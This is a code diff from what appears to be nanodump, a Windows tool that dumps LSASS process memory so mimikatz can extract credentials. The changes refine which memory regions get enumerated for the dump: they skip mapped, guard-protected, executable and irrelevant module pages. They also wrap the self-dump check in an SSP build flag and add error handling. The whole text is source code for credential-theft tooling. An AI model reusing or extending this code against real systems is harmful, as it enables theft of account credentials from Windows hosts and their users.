@@ -416,13 +416,14 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     current_address = 0;
     MEMORY_INFORMATION_CLASS mic = 0;
     MEMORY_BASIC_INFORMATION mbi;
-    DWORD number_of_ranges;
+    DWORD number_of_ranges = 0;
+    NTSTATUS status;
 
     DPRINT("Getting memory ranges to dump");
 
     while (TRUE)
     {
-        NTSTATUS status = NtQueryVirtualMemory(
+        status = NtQueryVirtualMemory(
             dc->hProcess,
             (PVOID)current_address,
             mic,
@@ -441,14 +442,17 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         // ignore non-commited pages
         if (mbi.State != MEM_COMMIT)
             continue;
+        // ignore mapped pages
+        if (mbi.Type  == MEM_MAPPED)
+            continue;
         // ignore pages with PAGE_NOACCESS
         if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
             continue;
-        // ignore mapped pages
-        if (mbi.Type == MEM_MAPPED)
+        // ignore pages with PAGE_GUARD
+        if ((mbi.Protect & PAGE_GUARD)    == PAGE_GUARD)
             continue;
-        // ignore pages with PAGE_GUARD as they can't be read
-        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
+        // ignore pages with PAGE_EXECUTE
+        if ((mbi.Protect & PAGE_EXECUTE)  == PAGE_EXECUTE)
             continue;
         // ignore modules that are not relevant to mimikatz
         if (mbi.Type == MEM_IMAGE &&
@@ -456,9 +460,11 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 base_address,
                 module_list))
             continue;
+#ifdef SSP
         // if nanodump is running in LSASS, don't dump the dump :)
-        if (dc->BaseAddress == base_address && dc->hProcess == NtCurrentProcess())
+        if (dc->BaseAddress == base_address)
             continue;
+#endif
 
         new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
@@ -486,6 +492,12 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
             last_range->next = new_range;
         }
         number_of_ranges++;
+    }
+    if (!ranges_list)
+    {
+        syscall_failed("NtQueryVirtualMemory", status);
+        DPRINT_ERR("Failed to enumerate memory ranges");
+        return NULL;
     }
     DPRINT(
         "Enumearted %ld ranges of memory",
